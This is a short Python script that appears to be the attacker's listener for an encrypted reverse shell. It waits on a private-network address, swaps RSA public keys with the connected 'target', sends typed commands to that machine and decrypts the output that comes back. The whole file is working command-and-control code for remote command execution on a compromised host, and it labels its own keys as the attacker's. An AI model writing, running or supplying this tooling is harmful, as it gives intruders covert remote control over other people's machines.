from cryptidy import asymmetric_encryption
import socket
import subprocess
import base64

HOST = '10.0.2.4' # Listen on all network interfaces
PORT = 12345  # Choose a port number
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
print(f"Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"Connection from {addr}")

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
print(f'attacker priv key: {priv_key}')
print(f'attacker pub key: {pub_key}')
conn.send(pub_key.encode())

target_pub_key = conn.recv(256).decode()
print(f'target pub key: {target_pub_key}')

while True:
    command = input("Enter command to execute or 'exit' to quit: ")
    if command.lower() == 'exit':
        conn.send(b'exit')
        conn.close()
        break
    conn.send(command.encode())
    encrypted_output_b64 = conn.recv(1024)
    encrypted_output = base64.b64decode(encrypted_output_b64)
    output = asymmetric_encryption.decrypt_message(encrypted_output_b64, priv_key)
    print(output, end="")
s.close()

